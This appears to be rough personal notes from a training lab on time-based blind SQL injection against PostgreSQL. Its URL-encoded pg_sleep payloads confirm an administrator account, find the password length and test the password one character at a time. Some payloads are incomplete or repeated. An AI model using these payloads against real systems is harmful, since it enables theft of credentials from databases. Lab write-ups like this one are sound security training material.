we want to find admin pass

';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) 
by using this query we time delay will be happen

`'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--` (encode)
 by using this query we didn't have a time delay
`'%3BSELECT+CASE+WHEN(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`(encode)
 by using this user administrator will be true
 
`'%3BSELECT+CASE+WHEN(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
 find the length of the password 19
 `'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
 first letter of the pass is m
 by brute forcing the password has been find


 